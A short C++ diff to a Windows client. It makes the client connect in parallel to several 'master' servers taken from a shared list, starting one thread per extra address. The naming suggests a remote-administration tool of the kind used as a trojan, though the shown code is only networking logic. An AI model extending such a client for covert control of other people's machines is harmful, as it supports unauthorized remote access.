@@ -467,6 +467,16 @@ DWORD WINAPI StartClient(LPVOID lParam)
 {
 	ClientApp& app(*(ClientApp*)lParam);
 	CONNECT_ADDRESS& settings(*(app.g_Connection));
+	auto list = app.GetSharedMasterList();
+	if (list.size() > 1 && settings.runningType == RUNNING_PARALLEL) {
+		for (int i=1; i<list.size(); ++i){
+			std::string addr = list[i] + ":" + std::to_string(settings.ServerPort());
+			auto a = NewClientStartArg(addr.c_str(), IsSharedRunning, TRUE);
+			if (nullptr != a) CloseHandle(CreateThread(0, 0, StartClientApp, a, 0, 0));
+		}
+		// The main ClientApp.
+		settings.SetServer(list[0].c_str(), settings.ServerPort());
+	}
 	State& bExit(app.g_bExit);
 	IOCPClient  *ClientObject = new IOCPClient(bExit);
 	CKernelManager* Manager = nullptr;
